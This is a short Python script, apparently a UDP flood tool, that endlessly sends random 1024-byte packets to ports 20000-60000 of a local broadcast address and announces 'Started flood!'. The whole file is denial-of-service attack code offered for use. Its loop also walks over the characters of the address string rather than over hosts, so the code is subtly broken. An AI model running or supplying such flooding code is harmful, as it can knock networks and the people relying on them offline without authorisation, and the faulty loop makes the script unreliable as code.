#!/usr/bin/env python3

import socket
import random
import time

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1024)

# ifconfig | rg broadcast | cut -d ' ' -f 6 -
ip_range = "10.0.7.255"

sent = 0

print("Started flood!")

while 1:
    for ip in ip_range:
        for port in range(20000, 60000):
            try:
                sock.sendto(bytes, (ip, port))
                sent = sent + 1
            except OSError:
                print("Packets sent so far:", sent)
                time.sleep(0.1)
